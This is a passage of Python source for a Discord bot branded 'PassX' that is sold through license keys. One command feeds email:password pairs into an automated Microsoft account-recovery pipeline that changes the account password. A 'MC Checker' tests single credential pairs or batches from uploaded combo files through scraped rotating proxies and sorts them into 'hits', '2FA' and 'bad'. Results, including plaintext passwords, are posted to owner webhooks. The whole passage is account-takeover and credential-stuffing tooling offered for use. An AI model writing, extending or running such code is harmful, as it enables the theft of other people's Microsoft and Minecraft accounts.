        print(Fore.GREEN + Style.BRIGHT + f"  [PROXY]   " + Fore.WHITE + f"Pool:     " + Fore.CYAN + f"{proxy_count['valid']} valid / {proxy_count['total']} total")
        start_proxy_refresher(daemon=True)
        print(Fore.GREEN + Style.BRIGHT + f"  [PROXY]   " + Fore.WHITE + f"Scraper:  " + Fore.CYAN + "Auto-refresh every 2 hours")
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"  [PROXY]   " + Fore.WHITE + f"Warning:  " + Fore.YELLOW + f"Could not start proxy system: {e}")

    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    print("")

    try:
        synced = await bot.tree.sync()
        print(Fore.GREEN + Style.BRIGHT + f"  ✓ Synced {len(synced)} slash commands successfully.\n")
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"  ✗ Sync error: {e}\n")

    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name="PassX by X Team  |  /help"
    ))

# ═══════════════════════════════════════════════
#  COMMANDS — USER
# ═══════════════════════════════════════════════
@bot.tree.command(name="help", description="View all commands")
async def help_command(i: discord.Interaction):
    if not data_manager.is_authorized(i.user.id) and not data_manager.is_owner(i.user.id) and i.user.id != ADMIN_ID:
        await i.response.send_message(
            embed=err("Not Authorized", f"{E_CROSS()}  Contact <@{ADMIN_ID}> to request access."),
            ephemeral=True
        )
        return

    e = discord.Embed(
        title=f"{E_DIAMOND()}  PassX — All Commands",
        description=(
            f"> {E_UPDATES()}  Automated Microsoft account recovery + MC Checker.\n"
            f"> {E_PIN()}  Made By X Team.\n\n{SEP}"
        ),
        color=C_BRAND,
        timestamp=datetime.now()
    )
    e.add_field(
        name=f"{E_BOOK()}  Authentication",
        value=(
            f"`/request_otp` — Get login code via DM\n"
            f"`/verify_otp <code>` — Activate session\n"
            f"`/logout` — End session"
        ), inline=False
    )
    e.add_field(
        name=f"{E_SETTINGS()}  PassChanger (requires passchanger license)",
        value=(
            f"`/process <email:pass>` — Launch password recovery pipeline\n"
            f"`/submit_captcha <text>` — Submit CAPTCHA answer\n"
            f"`/status` — Check session state\n"
            f"`/cancel` — Abort active process"
        ), inline=False
    )
    e.add_field(
        name=f"⛏️  MC Checker (requires checker license)",
        value=(
            f"`/mccheck <email:pass>` — Check single account for MC\n"
            f"`/mccheck_file` — Upload .txt file for batch checking\n"
            f"• Proxy mode: Proxies or Proxyless\n"
            f"• Shows: ownership, capes, Hypixel stats, bans"
        ), inline=False
    )
    e.add_field(
        name=f"{E_DIAMOND()}  License",
        value=(
            f"`/redeem <key>` — Activate a license key (timer starts now)\n"
            f"`/mylicense` — Check your license status & remaining time"
        ), inline=False
    )
    if i.user.id == ADMIN_ID or data_manager.is_owner(i.user.id):
        e.add_field(
            name=f"{E_ALERT()}  Administration",
            value=(
                f"`/admin` — Control panel\n"
                f"`/authorize @user product:` — Grant lifetime access (passchanger/checker/both)\n"
                f"`/revoke @user` — Remove all access\n"
                f"`/list_users` — View authorized users\n"
                f"`/set_webhook <url>` — Set user results webhook\n"
                f"`/set_owner_webhook <url>` — Set owner webhook (logs everything)\n"
                f"`/stats` — Performance metrics"
            ), inline=False
        )
        e.add_field(
            name=f"{E_SETTINGS()}  Key Management",
            value=(
                f"`/genkey product: days: hours: minutes: seconds: lifetime: key_valid_hours:`\n"
                f"• Generate keys for passchanger/checker/both\n"
                f"• Custom duration, key validity, timer on redeem\n"
                f"`/listkeys` — View all keys + status\n"
                f"`/revokekey @user` — Expire user's keys"
            ), inline=False
        )
    if data_manager.is_owner(i.user.id):
        e.add_field(
            name=f"👑  Owner Commands",
            value=(
                f"`/owner` — Owner control panel\n"
                f"`/owner_add @user` — Add an owner\n"
                f"`/owner_remove @user` — Remove an owner\n"
                f"`/owner_process <email:pass>` — Process (bypass OTP)\n"
                f"`/owner_authorize @user` — Grant access\n"
                f"`/owner_revoke @user` — Remove access\n"
                f"`/owner_genkey` — Generate key (custom duration)\n"
                f"`/owner_webhook <url>` — Set webhook\n"
                f"`/owner_stats` — View stats"
            ), inline=False
        )
    e.add_field(
        name=f"{E_PIN()}  Quick Start",
        value=(
            f"{E_ONE()}  `/request_otp` → check DMs\n"
            f"{E_TWO()}  `/verify_otp <code>` → login\n"
            f"{E_THREE()}  `/process email:password` → PassChanger\n"
            f"{E_THREE()}  `/mccheck email:password` → MC Checker\n"
            f"{E_ALERT()}  `/mccheck_file` → Batch check from .txt"
        ), inline=False
    )
    e.set_footer(text=FOOTER)
    await i.response.send_message(embed=e, ephemeral=True)


@bot.tree.command(name="request_otp", description="Get a one-time login code via DM")
@check_auth()
async def request_otp(i: discord.Interaction):
    uid = i.user.id
    if data_manager.is_authenticated(uid):
        await i.response.send_message(
            embed=info("Already Logged In", f"{E_TICK()}  Your session is active. Use `/logout` to reset."),
            ephemeral=True
        )
        return

    otp = data_manager.generate_otp(uid)
    try:
        dm_embed = discord.Embed(
            title=f"{E_BOOK()}  Your PassX Access Code",
            description=(
                f"## `  {otp}  `\n\n"
                f"{E_UPDATES()}  Use in server:\n`/verify_otp {otp}`\n\n"
                f"> ⏱ Valid **5 minutes**\n"
                f"> {E_ALERT()}  Do **not** share this code"
            ),
            color=C_PURPLE,
            timestamp=datetime.now()
        )
        dm_embed.set_footer(text=FOOTER)
        await i.user.send(embed=dm_embed)
        await i.response.send_message(
            embed=ok("Code Sent", f"{E_TICK()}  Check your Direct Messages."),
            ephemeral=True
        )
    except discord.Forbidden:
        await i.response.send_message(
            embed=err("DMs Blocked", f"{E_CROSS()}  Enable DMs from server members in Privacy Settings."),
            ephemeral=True
        )


@bot.tree.command(name="verify_otp", description="Verify OTP to start a session")
@app_commands.describe(code="The 6-digit code from your DMs")
@check_auth()
async def verify_otp(i: discord.Interaction, code: str):
    success, msg = data_manager.verify_otp(i.user.id, code.strip())
    if success:
        await i.response.send_message(embed=ok(
            "Session Activated",
            f"{E_TICK()}  {msg}\n\nRun `/process email:password` to begin."
        ))
    else:
        await i.response.send_message(
            embed=err("Verification Failed", f"{E_CROSS()}  {msg}"), ephemeral=True
        )


@bot.tree.command(name="logout", description="End your active session")
@check_login()
async def logout_command(i: discord.Interaction):
    data_manager.logout(i.user.id)
    await i.response.send_message(embed=info(
        "Session Ended",
        f"{E_UPDATES()}  Signed out. Use `/request_otp` to log back in."
    ))


@bot.tree.command(name="process", description="Start the account recovery pipeline")
@app_commands.describe(account="Format: email:password")
@check_auth("passchanger")
@check_login()
async def process_account(i: discord.Interaction, account: str):
    uid = i.user.id

    if ":" not in account:
        await i.response.send_message(
            embed=err("Invalid Format",
                      f"{E_CROSS()}  Expected `email:password`\nExample: `user@outlook.com:Pass123`"),
            ephemeral=True
        )
        return

    if uid in data_manager.processing_sessions:
        await i.response.send_message(
            embed=warn("Already Running",
                       f"{E_ALERT()}  You have an active process.\nUse `/cancel` to abort first."),
            ephemeral=True
        )
        return

    email, password = account.split(":", 1)
    email, password = email.strip(), password.strip()

    await i.response.send_message(embed=brand(
        "Pipeline Initiated",
        f"{E_RECORD()}  Target: `{email}`\n\n"
        f"{E_UPDATES()}  Live progress tracker will appear below."
    ))

    asyncio.create_task(process_account_full(email, password, uid, i.channel))


@bot.tree.command(name="submit_captcha", description="Submit your CAPTCHA answer")
@app_commands.describe(text="The text shown in the CAPTCHA image")
@check_login()
async def submit_captcha(i: discord.Interaction, text: str):
    uid = i.user.id
    if uid not in data_manager.processing_sessions:
        await i.response.send_message(
            embed=warn("No Active CAPTCHA", f"{E_ALERT()}  Nothing is waiting for input."),
            ephemeral=True
        )
        return
    await continue_after_captcha(uid, text.strip(), i)


@bot.tree.command(name="status", description="Check your session and pipeline state")
@check_login()
async def check_status(i: discord.Interaction):
    uid    = i.user.id
    fields = [{"name": f"{E_BOOK()}  Auth", "value": f"{E_TICK()}  Active", "inline": True}]

    if uid in data_manager.processing_sessions:
        s = data_manager.processing_sessions[uid]
        fields += [
            {"name": f"{E_SETTINGS()}  Pipeline", "value": f"{E_ALERT()}  CAPTCHA Pending", "inline": True},
            {"name": f"{E_MAIL()}  Target",        "value": f"`{s['email']}`",               "inline": False},
            {"name": f"{E_RECORD()}  Attempts",    "value": f"{s['captcha_attempts']} / 3",  "inline": True},
            {"name": f"{E_PIN()}  Channel",        "value": f"<#{s['channel_id']}>",         "inline": True},
        ]
        emb = warn("Active Pipeline", f"{E_ALERT()}  CAPTCHA is waiting for your input.", fields)
    else:
        fields.append({"name": f"{E_SETTINGS()}  Pipeline",
                       "value": f"{E_TICK()}  Idle — ready", "inline": True})
        emb = ok("All Clear", f"{E_TICK()}  No active process. Run `/process` to begin.", fields)

    await i.response.send_message(embed=emb, ephemeral=True)


@bot.tree.command(name="cancel", description="Cancel your current processing session")
@check_login()
async def cancel_process(i: discord.Interaction):
    uid = i.user.id
    if uid not in data_manager.processing_sessions:
        await i.response.send_message(
            embed=info("Nothing to Cancel", f"{E_UPDATES()}  No active process found."),
            ephemeral=True
        )
        return

    session = data_manager.processing_sessions[uid]
    prog: Progress = session.get("progress")
    if prog:
        for idx, state in enumerate(prog.step_states):
            if state in (ACTIVE, WAITING):
                await prog.step_fail(idx, f"{E_CROSS()}  **Cancelled by user.**")
                break

    _cleanup(uid, session.get("driver"), session)
    await i.response.send_message(
        embed=ok("Cancelled", f"{E_TICK()}  Pipeline aborted. All resources released.")
    )


# ═══════════════════════════════════════════════
#  MINECRAFT CHECKER COMMAND
# ═══════════════════════════════════════════════
@bot.tree.command(name="mccheck", description="Check a Microsoft account for Minecraft ownership & stats")
@app_commands.describe(
    account="Format: email:password",
    proxy_mode="Use scraped proxies or go proxyless"
)
@app_commands.choices(proxy_mode=[
    app_commands.Choice(name="Use Proxies (Recommended)", value="proxy"),
    app_commands.Choice(name="Proxyless", value="proxyless"),
])
@check_auth("checker")
@check_login()
async def mc_check_cmd(i: discord.Interaction, account: str, proxy_mode: str = "proxy"):
    uid = i.user.id

    if ":" not in account:
        await i.response.send_message(
            embed=err("Invalid Format", f"{E_CROSS()}  Expected `email:password`"),
            ephemeral=True
        )
        return

    email, password = account.split(":", 1)
    email, password = email.strip(), password.strip()
    use_proxy = proxy_mode == "proxy"

    await i.response.defer(ephemeral=True)

    # Run the checker in a thread pool to avoid blocking
    loop = asyncio.get_event_loop()
    try:
        from automation.mc_checker import check_mc_account
        result = await loop.run_in_executor(None, check_mc_account, email, password, use_proxy)
    except Exception as e:
        await send_webhook_log("MC Check — Error", f"`{email}` — Exception: `{e}`", color=C_ERROR, user_id=uid)
        await i.followup.send(embed=err("Checker Error", f"```{e}```"), ephemeral=True)
        return

    status = result.get("status", "error")

    if status == "bad":
        await send_webhook_log(
            "MC Check — Bad",
            f"`{email}` — Invalid credentials (wrong password or doesn't exist)",
            [{"name": "Email", "value": f"`{email}`", "inline": True}],
            color=C_ERROR, user_id=uid
        )
        await i.followup.send(embed=err(
            "Invalid Account",
            f"{E_CROSS()}  Wrong password or account doesn't exist.\n`{email}`"
        ), ephemeral=True)
        return

    if status == "2fa":
        await send_webhook_log(
            "MC Check — 2FA",
            f"`{email}` — Account has 2FA/security verification enabled",
            [{"name": "Email", "value": f"`{email}`", "inline": True}],
            color=C_PURPLE, user_id=uid
        )
        await i.followup.send(embed=warn(
            "2FA Enabled",
            f"{E_ALERT()}  Account has 2FA/security verification enabled.\n`{email}`"
        ), ephemeral=True)
        return

    if status == "no_mc":
        await send_webhook_log(
            "MC Check — Valid Mail (No MC)",
            f"`{email}` — Valid Microsoft account, does NOT own Minecraft",
            [{"name": "Email", "value": f"`{email}`", "inline": True}],
            color=C_WARN, user_id=uid
        )
        await i.followup.send(embed=info(
            "No Minecraft",
            f"{E_UPDATES()}  Account is valid but does **not** own Minecraft.\n`{email}`"
        ), ephemeral=True)
        return

    if status == "valid_no_mc":
        await send_webhook_log(
            "MC Check — Valid Login (No MC Token)",
            f"`{email}` — Login successful but couldn't get MC token",
            [{"name": "Email", "value": f"`{email}`", "inline": True}],
            color=C_WARN, user_id=uid
        )
        await i.followup.send(embed=info(
            "Valid Login — No MC",
            f"{E_TICK()}  Login **valid** but could not retrieve Minecraft token.\n`{email}`"
        ), ephemeral=True)
        return

    if status == "locked":
        await send_webhook_log(
            "MC Check — Locked",
            f"`{email}` — Account is locked by Microsoft",
            [{"name": "Email", "value": f"`{email}`", "inline": True}],
            color=C_ERROR, user_id=uid
        )
        await i.followup.send(embed=err(
            "Account Locked",
            f"{E_CROSS()}  Account is locked by Microsoft.\n`{email}`"
        ), ephemeral=True)
        return

    if status == "error":
        await send_webhook_log(
            "MC Check — Error",
            f"`{email}` — {result.get('error', 'Unknown error')}",
            [{"name": "Email", "value": f"`{email}`", "inline": True},
             {"name": "Error", "value": result.get('error', 'Unknown'), "inline": False}],
            color=C_ERROR, user_id=uid
        )
        await i.followup.send(embed=err(
            "Check Failed",
            f"{E_CROSS()}  {result.get('error', 'Unknown error')}\n`{email}`"
        ), ephemeral=True)
        return

    # ── HIT — Build detailed embed ──
    username = result.get("username", "N/A")
    uuid_val = result.get("uuid", "N/A")
    ownership = result.get("ownership", "Unknown")
    capes = result.get("capes", "None")
    hypixel = result.get("hypixel", {})
    optifine = result.get("optifine_cape")
    name_change = result.get("name_change", {})

    fields = [
        {"name": "📧  Email", "value": f"`{email}`", "inline": False},
        {"name": "🔒  Password", "value": f"||`{password}`||", "inline": True},
        {"name": "🎮  Username", "value": f"`{username}`", "inline": True},
        {"name": "🆔  UUID", "value": f"`{uuid_val}`", "inline": False},
        {"name": "👑  Ownership", "value": f"`{ownership}`", "inline": True},
        {"name": "🧥  Capes", "value": f"`{capes}`", "inline": True},
    ]

    # Optifine
    if optifine is not None:
        fields.append({"name": "✨  Optifine Cape", "value": "Yes" if optifine else "No", "inline": True})

    # Hypixel
    if hypixel:
        hyp_parts = []
        if hypixel.get("level"):
            hyp_parts.append(f"Level: **{hypixel['level']}**")
        if hypixel.get("first_login"):
            hyp_parts.append(f"First Login: {hypixel['first_login']}")
        if hypixel.get("last_login"):
            hyp_parts.append(f"Last Login: {hypixel['last_login']}")
        if hypixel.get("bw_stars"):
            hyp_parts.append(f"BW Stars: {hypixel['bw_stars']}")
        if hyp_parts:
            fields.append({"name": "⬛  ━━ HYPIXEL ━━", "value": "\u200b", "inline": False})
            fields.append({"name": "📊  Stats", "value": "\n".join(hyp_parts), "inline": False})

    # Name change
    if name_change:
        nc_parts = []
        if name_change.get("can_change"):
            nc_parts.append(f"Can Change: **{name_change['can_change']}**")
        if name_change.get("last_changed"):
            nc_parts.append(f"Last Changed: {name_change['last_changed']}")
        if nc_parts:
            fields.append({"name": "📝  Name Change", "value": "\n".join(nc_parts), "inline": False})

    # Proxy mode used
    fields.append({"name": "🌐  Proxy Mode", "value": f"`{'Proxies' if use_proxy else 'Proxyless'}`", "inline": True})

    embed = ok(f"Minecraft Hit — {username}", f"{E_TICK()}  Account owns Minecraft!", fields)
    # Set thumbnail to MC head
    if uuid_val and uuid_val != "N/A":
        embed.set_thumbnail(url=f"https://crafatar.com/avatars/{uuid_val}?overlay=true")

    await i.followup.send(embed=embed, ephemeral=True)

    # Webhook log
    await send_webhook_log(
        "MC Check — Hit",
        f"`{email}` owns **{ownership}** — Username: `{username}`",
        [
            {"name": "Ownership", "value": ownership, "inline": True},
            {"name": "Username", "value": f"`{username}`", "inline": True},
            {"name": "Capes", "value": capes, "inline": True},
        ],
        color=C_SUCCESS, user_id=uid
    )


@bot.tree.command(name="mccheck_file", description="Batch check accounts from a txt file (email:password per line)")
@app_commands.describe(
    file="Upload a .txt file with email:password on each line",
    proxy_mode="Use scraped proxies or go proxyless"
)
@app_commands.choices(proxy_mode=[
    app_commands.Choice(name="Use Proxies (Recommended)", value="proxy"),
    app_commands.Choice(name="Proxyless", value="proxyless"),
])
@check_auth("checker")
@check_login()
async def mc_check_file_cmd(i: discord.Interaction, file: discord.Attachment, proxy_mode: str = "proxy"):
    uid = i.user.id

    # Validate file
    if not file.filename.endswith(".txt"):
        await i.response.send_message(
            embed=err("Invalid File", f"{E_CROSS()}  Please upload a `.txt` file."), ephemeral=True
        )
        return

    if file.size > 1_000_000:  # 1MB limit
        await i.response.send_message(
            embed=err("File Too Large", f"{E_CROSS()}  Max file size: 1MB"), ephemeral=True
        )
        return

    await i.response.defer()

    # Read file contents
    try:
        content = (await file.read()).decode("utf-8", errors="ignore")
    except Exception as e:
        await i.followup.send(embed=err("Read Error", f"{E_CROSS()}  Could not read file: {e}"))
        return

    # Parse combos
    lines = [l.strip() for l in content.splitlines() if ":" in l.strip() and l.strip()]
    if not lines:
        await i.followup.send(embed=err("Empty File", f"{E_CROSS()}  No valid `email:password` lines found."))
        return

    if len(lines) > 50:
        lines = lines[:50]  # Cap at 50 to avoid rate limits

    use_proxy = proxy_mode == "proxy"
    total = len(lines)

    # Send initial status
    status_embed = brand(
        "MC Batch Check Started",
        f"{E_RECORD()}  Checking **{total}** accounts...\n"
        f"Mode: `{'Proxies' if use_proxy else 'Proxyless'}`\n\n"
        f"This may take a while. Results will be posted when done."
    )
    await i.followup.send(embed=status_embed)

    # Run checks in background
    async def run_batch():
        from automation.mc_checker import check_mc_account
        loop = asyncio.get_event_loop()

        hits = []
        no_mc = []
        bad = []
        twofa = []
        errors = []

        for idx, line in enumerate(lines):
            try:
                email, password = line.split(":", 1)
                email, password = email.strip(), password.strip()
                if not email or not password:
                    bad.append(line)
                    continue

                result = await loop.run_in_executor(None, check_mc_account, email, password, use_proxy)
                status = result.get("status", "error")

                if status == "hit":
                    username = result.get("username", "N/A")
                    ownership = result.get("ownership", "Unknown")
                    hits.append(f"`{email}` — **{username}** ({ownership})")
                elif status == "no_mc":
                    no_mc.append(f"`{email}`")
                elif status == "2fa":
                    twofa.append(f"`{email}`")
                elif status == "bad":
                    bad.append(f"`{email}`")
                else:
                    errors.append(f"`{email}`")

            except Exception:
                errors.append(f"`{line[:30]}`")

        # Build results embed
        desc_parts = [f"Checked **{total}** accounts\n{SEP}"]

        fields = []
        if hits:
            fields.append({"name": f"{E_TICK()}  Hits ({len(hits)})", "value": "\n".join(hits[:15]) + (f"\n...+{len(hits)-15} more" if len(hits) > 15 else ""), "inline": False})
        if no_mc:
            fields.append({"name": f"{E_UPDATES()}  No MC ({len(no_mc)})", "value": "\n".join(no_mc[:10]) + (f"\n...+{len(no_mc)-10} more" if len(no_mc) > 10 else ""), "inline": False})
        if twofa:
            fields.append({"name": f"{E_ALERT()}  2FA ({len(twofa)})", "value": "\n".join(twofa[:10]) + (f"\n...+{len(twofa)-10} more" if len(twofa) > 10 else ""), "inline": False})
        if bad:
            fields.append({"name": f"{E_CROSS()}  Bad ({len(bad)})", "value": "\n".join(bad[:10]) + (f"\n...+{len(bad)-10} more" if len(bad) > 10 else ""), "inline": False})
        if errors:
            fields.append({"name": "⚠️  Errors ({})".format(len(errors)), "value": "\n".join(errors[:5]), "inline": False})

        fields.append({"name": "📊  Summary", "value": f"{E_TICK()} Hits: **{len(hits)}** | No MC: **{len(no_mc)}** | 2FA: **{len(twofa)}** | Bad: **{len(bad)}** | Errors: **{len(errors)}**", "inline": False})

        result_embed = ok("Batch Check Complete", "\n".join(desc_parts), fields)
        await i.channel.send(content=f"<@{uid}>", embed=result_embed)

        # Webhook log
        await send_webhook_log(
            "MC Batch Check Complete",
            f"<@{uid}> checked **{total}** accounts — **{len(hits)}** hits",
            [{"name": "Hits", "value": str(len(hits)), "inline": True},
             {"name": "Bad", "value": str(len(bad)), "inline": True},
             {"name": "2FA", "value": str(len(twofa)), "inline": True}],
            color=C_SUCCESS if hits else C_WARN, user_id=uid
        )

    asyncio.create_task(run_batch())


# ═══════════════════════════════════════════════
#  COMMANDS — ADMIN
# ═══════════════════════════════════════════════
@bot.tree.command(name="admin", description="[Admin] Control panel")
async def admin_panel(i: discord.Interaction):
    if i.user.id != ADMIN_ID and not data_manager.is_owner(i.user.id):
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator/Owner only."), ephemeral=True
        )
        return
    s = data_manager.stats
    await i.response.send_message(embed=adm(
        "PassX Control Panel", "Administration overview",
        [
            {"name": f"{E_BOOK()}  Users",
             "value": f"Auth'd: **{len(data_manager.authorized_users)}**\nSessions: **{len(data_manager.active_sessions)}**",
             "inline": True},
            {"name": f"{E_RECORD()}  Live",
             "value": f"Pipelines: **{len(data_manager.processing_sessions)}**",
             "inline": True},
            {"name": f"{E_UPDATES()}  Stats",
             "value": f"Total: **{s['total_processed']}**\n{E_TICK()} {s['total_success']}  {E_CROSS()} {s['total_failed']}",
             "inline": True},
            {"name": f"{E_PIN()}  Webhook",
             "value": f"{E_TICK()} Configured" if data_manager.config.get("webhook_url") else f"{E_CROSS()} Not set",
             "inline": True},
            {"name": f"{E_SETTINGS()}  Commands",
             "value": "`/authorize` `/revoke` `/list_users` `/set_webhook` `/stats`",
             "inline": False},
        ]
    ), ephemeral=True)


@bot.tree.command(name="authorize", description="[Admin/Owner] Grant a user LIFETIME access to a product")
@app_commands.describe(user="User to authorize", product="Which product to grant access to")
@app_commands.choices(product=[
    app_commands.Choice(name="Both (PassChanger + Checker)", value="both"),
    app_commands.Choice(name="PassChanger Only", value="passchanger"),
    app_commands.Choice(name="MC Checker Only", value="checker"),
])
async def authorize_user(i: discord.Interaction, user: discord.User, product: str = "both"):
    if i.user.id != ADMIN_ID and not data_manager.is_owner(i.user.id):
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator/Owner only."), ephemeral=True
        )
        return
    # Grant lifetime license + authorize
    if not data_manager.is_authorized(user.id):
        data_manager.authorize_user(user.id, i.user.id)
    grant_lifetime(user.id, i.user.id, product=product)
    product_label = {"both": "PassChanger + Checker", "passchanger": "PassChanger", "checker": "MC Checker"}[product]
    await i.response.send_message(embed=ok(
        "Lifetime Access Granted",
        f"{E_TICK()}  {user.mention} now has **Lifetime** access to **{product_label}**.",
        [
            {"name": f"{E_MAIL()}  User ID", "value": f"`{user.id}`", "inline": True},
            {"name": "👑  Product", "value": f"`{product_label}`", "inline": True},
            {"name": "⏰  License", "value": "`Lifetime (Never expires)`", "inline": True},
            {"name": f"{E_UPDATES()}  Granted By", "value": f"<@{i.user.id}>", "inline": True},
        ]
    ))
    await send_webhook_log(
        "Lifetime Access Granted",
        f"{user.mention} was granted **Lifetime {product_label}** access by <@{i.user.id}>",
        color=C_GOLD, user_id=i.user.id
    )
    try:
        await user.send(embed=ok(
            "Lifetime Access Granted!",
            f"{E_TICK()}  You have been given **Lifetime** access to **{product_label}** by **{i.user.name}**.\n"
            f"Run `/help` to get started."
        ))
    except Exception:
        pass


@bot.tree.command(name="revoke", description="[Admin] Remove user access")
@app_commands.describe(user="User to revoke")
async def revoke_user(i: discord.Interaction, user: discord.User):
    if i.user.id != ADMIN_ID and not data_manager.is_owner(i.user.id):
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator/Owner only."), ephemeral=True
        )
        return
    if user.id == ADMIN_ID or data_manager.is_owner(user.id):
        await i.response.send_message(
            embed=err("Blocked", f"{E_CROSS()}  Cannot revoke an admin/owner."), ephemeral=True
        )
        return
    data_manager.revoke_user(user.id)
    await i.response.send_message(
        embed=ok("Revoked", f"{E_TICK()}  {user.mention}'s access removed.")
    )


@bot.tree.command(name="list_users", description="[Admin] View all authorized users")
async def list_users(i: discord.Interaction):
    if i.user.id != ADMIN_ID and not data_manager.is_owner(i.user.id):
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator/Owner only."), ephemeral=True
        )
        return
    lines = []
    for uid in data_manager.authorized_users:
        try:
            u = await bot.fetch_user(int(uid))
            lines.append(f"{E_TICK()}  **{u.name}** — `{uid}`")
        except Exception:
            lines.append(f"{E_UPDATES()}  Unknown — `{uid}`")
    body = "\n".join(lines) if lines else f"{E_CROSS()}  No users on the access list."
    await i.response.send_message(embed=adm("Access List", body), ephemeral=True)


@bot.tree.command(name="set_webhook", description="[Admin] Set the results webhook URL")
@app_commands.describe(webhook_url="Discord webhook URL")
async def set_webhook(i: discord.Interaction, webhook_url: str):
    if i.user.id != ADMIN_ID and not data_manager.is_owner(i.user.id):
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator/Owner only."), ephemeral=True
        )
        return
    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        await i.response.send_message(
            embed=err("Invalid URL", f"{E_CROSS()}  Must be a valid Discord webhook URL."),
            ephemeral=True
        )
        return
    data_manager.config["webhook_url"] = webhook_url
    data_manager.save_config()
    await i.response.send_message(
        embed=ok("Webhook Set", f"{E_TICK()}  Results will now dispatch to the webhook."),
        ephemeral=True
    )
    await send_webhook_log(
        "Webhook Updated",
        f"Webhook URL was updated by <@{i.user.id}>",
        color=C_INFO, user_id=i.user.id
    )


@bot.tree.command(name="set_owner_webhook", description="[Owner] Set the owner webhook (logs EVERYTHING)")
@app_commands.describe(webhook_url="Discord webhook URL for owner logging")
async def set_owner_webhook(i: discord.Interaction, webhook_url: str):
    if not data_manager.is_owner(i.user.id):
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Owner only."), ephemeral=True
        )
        return
    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        await i.response.send_message(
            embed=err("Invalid URL", f"{E_CROSS()}  Must be a valid Discord webhook URL."),
            ephemeral=True
        )
        return
    data_manager.config["owner_webhook_url"] = webhook_url
    data_manager.save_config()
    await i.response.send_message(
        embed=ok("Owner Webhook Set", f"👑  {E_TICK()}  Owner webhook configured.\nAll events will be logged here."),
        ephemeral=True
    )


@bot.tree.command(name="stats", description="[Admin] View detailed statistics")
async def view_stats(i: discord.Interaction):
    if i.user.id != ADMIN_ID and not data_manager.is_owner(i.user.id):
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Administrator/Owner only."), ephemeral=True
        )
        return
    s    = data_manager.stats
    rate = (s["total_success"] / s["total_processed"] * 100) if s["total_processed"] else 0
    top  = sorted(s["users_served"].items(), key=lambda x: x[1]["processed"], reverse=True)[:5]
    top_text = "\n".join(
        f"{E_TICK()}  <@{uid}> — {d['processed']} processed ({d['success']} success)"
        for uid, d in top
    ) or f"{E_UPDATES()}  No data yet."
    await i.response.send_message(embed=adm(
        "Performance Metrics", SEP,
        [
            {"name": f"{E_UPDATES()}  Volume",
             "value": f"Total: **{s['total_processed']}**\n{E_TICK()} {s['total_success']}  {E_CROSS()} {s['total_failed']}",
             "inline": True},
            {"name": f"{E_RECORD()}  Success Rate", "value": f"**{rate:.1f}%**", "inline": True},
            {"name": f"{E_BOOK()}  Users",
             "value": f"Auth'd: **{len(data_manager.authorized_users)}**\nActive: **{len(data_manager.active_sessions)}**",
             "inline": True},
            {"name": f"{E_PIN()}  Top Operators", "value": top_text, "inline": False},
        ]
    ), ephemeral=True)


# ═══════════════════════════════════════════════
#  LICENSE / KEY SYSTEM
# ═══════════════════════════════════════════════

@bot.tree.command(name="redeem", description="Redeem a PassX license key")
@app_commands.describe(key="Your key e.g. PASSX-AB12-CD34-EF56")
async def redeem_cmd(i: discord.Interaction, key: str):
    uid = i.user.id
    success, result = redeem_key(key.strip().upper(), uid)
    if not success:
        await i.response.send_message(
            embed=err("Invalid Key", f"{E_CROSS()}  {result}"), ephemeral=True
        )
        return
    # result is a dict with duration info
    duration_label = result["duration_label"]
    license_expires_at = result["license_expires_at"]
    product = result.get("product", "both")
    product_label = {"both": "PassChanger + Checker", "passchanger": "PassChanger", "checker": "MC Checker"}[product]

    # Auto-authorize
    if not data_manager.is_authorized(uid):
        data_manager.authorize_user(uid, "key_system")

    if license_expires_at:
        exp_dt = datetime.fromisoformat(license_expires_at)
        exp_str = exp_dt.strftime("%d %b %Y %H:%M UTC")
        remaining = exp_dt - datetime.now()
        remaining_str = _format_duration(int(remaining.total_seconds()))
    else:
        exp_str = "Never — Lifetime"
        remaining_str = "Unlimited"

    await i.response.send_message(embed=ok(
        "Key Redeemed!",
        f"{E_TICK()}  License activated — timer starts **now**!",
        [
            {"name": "📦  Product", "value": f"`{product_label}`", "inline": True},
            {"name": "👑  Duration", "value": f"`{duration_label}`", "inline": True},
            {"name": "⏰  Expires", "value": exp_str, "inline": True},
            {"name": "⏳  Remaining", "value": remaining_str, "inline": True},
            {"name": f"{E_UPDATES()}  Next", "value": "Use `/request_otp` to log in.", "inline": False},
        ]
    ), ephemeral=True)
    await send_webhook_log(
        "Key Redeemed",
        f"<@{uid}> redeemed a **{duration_label}** key for **{product_label}**",
        [{"name": "Product", "value": product_label, "inline": True},
         {"name": "Expires", "value": exp_str, "inline": True}],
        color=C_SUCCESS, user_id=uid
    )
    try:
        dm = discord.Embed(title=f"{E_DIAMOND()}  PassX License Activated", color=C_SUCCESS, timestamp=datetime.now())
        dm.add_field(name="Product", value=f"`{product_label}`", inline=True)
        dm.add_field(name="Duration", value=f"`{duration_label}`", inline=True)
        dm.add_field(name="Expires", value=exp_str, inline=True)
        dm.add_field(name="Remaining", value=remaining_str, inline=True)
        dm.set_footer(text=FOOTER)
        await i.user.send(embed=dm)
    except Exception:
        pass


@bot.tree.command(name="mylicense", description="Check your active license")
async def my_license(i: discord.Interaction):
    lic = get_user_license(i.user.id)
    if not lic:
        await i.response.send_message(embed=err(
            "No License",
            f"{E_CROSS()}  No active license.\nAsk admin for a key and use `/redeem <key>`."
        ), ephemeral=True)
        return
    if lic["license_expires_at"]:
        exp = datetime.fromisoformat(lic["license_expires_at"])
        remaining = exp - datetime.now()
        exp_str = exp.strftime("%d %b %Y %H:%M UTC")
        left = _format_duration(int(remaining.total_seconds()))
    else:
        exp_str = "Never"
        left = "Lifetime (Unlimited)"
    await i.response.send_message(embed=ok(
        "Your License",
        f"{E_TICK()}  License is active.",
        [
